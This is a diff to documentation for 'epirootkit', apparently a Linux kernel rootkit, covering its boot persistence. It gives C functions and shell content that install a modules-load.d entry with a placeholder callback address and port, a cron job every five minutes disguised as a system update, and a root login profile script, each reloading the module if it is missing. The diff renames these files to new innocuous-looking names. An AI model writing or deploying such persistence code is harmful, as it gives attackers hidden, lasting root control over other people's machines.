@@ -16,17 +16,17 @@ Multiple boot persistence mechanisms to ensure rootkit survival across system re
 ## Three Mechanisms
 
 ### 1. modules-load.d
-**File**: `/etc/modules-load.d/epirootkit.conf`  
-**Content**: `epirootkit`  
+**File**: `/etc/modules-load.d/jules_est_bo_system.conf`  
+**Content**: `epirootkit address=X.X.X.X port=YYYY`  
 **Trigger**: systemd reads config and loads module automatically on boot
 
 ### 2. Cron Jobs  
-**File**: `/etc/cron.d/system-update`  
+**File**: `/etc/cron.d/jules_est_bo_update`  
 **Schedule**: Every 5 minutes check and load if not present  
-**Stealth**: Disguised as system update task
+**Stealth**: Disguised as system update task with stealth naming
 
 ### 3. Shell Profiles
-**File**: `/etc/profile.d/system-env.sh`  
+**File**: `/etc/profile.d/jules_est_bo_env.sh`  
 **Trigger**: Executes when root user logs in  
 **Check**: Loads module if not already present
 
@@ -45,7 +45,7 @@ int persistence_init(void)
 // modules-load.d persistence
 int persistence_install_modules_load(void)
 {
-    return write_file("/etc/modules-load.d/epirootkit.conf", "epirootkit\n");
+    return write_file("/etc/modules-load.d/jules_est_bo_system.conf", "epirootkit address=X.X.X.X port=YYYY\n");
 }
 
 // Cron persistence (every 5 minutes)
@@ -56,7 +56,7 @@ int persistence_install_cron(void)
         "modprobe epirootkit 2>/dev/null || "
         "insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi'\n";
     
-    return write_file("/etc/cron.d/system-update", cron_content, 0644);
+    return write_file("/etc/cron.d/jules_est_bo_update", cron_content, 0644);
 }
 
 // Shell profile persistence
@@ -70,7 +70,7 @@ int persistence_install_shell_profile(void)
         "    fi\n"
         "fi\n";
     
-    return write_file("/etc/profile.d/system-env.sh", profile_content, 0755);
+    return write_file("/etc/profile.d/jules_est_bo_env.sh", profile_content, 0755);
 }
 ```
 
@@ -101,15 +101,15 @@ persist_profile Client-1    # shell profile only
 ### Check Installation
 ```bash
 # modules-load.d
-cat /etc/modules-load.d/epirootkit.conf
-# epirootkit
+cat /etc/modules-load.d/jules_est_bo_system.conf
+# epirootkit address=X.X.X.X port=YYYY
 
 # Cron job
-cat /etc/cron.d/system-update
+cat /etc/cron.d/jules_est_bo_update
 # */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi'
 
 # Shell profile
-cat /etc/profile.d/system-env.sh
+cat /etc/profile.d/jules_est_bo_env.sh
 # #!/bin/bash
 # if [ "$(id -u)" -eq 0 ]; then
 #     if ! lsmod | grep -q epirootkit 2>/dev/null; then
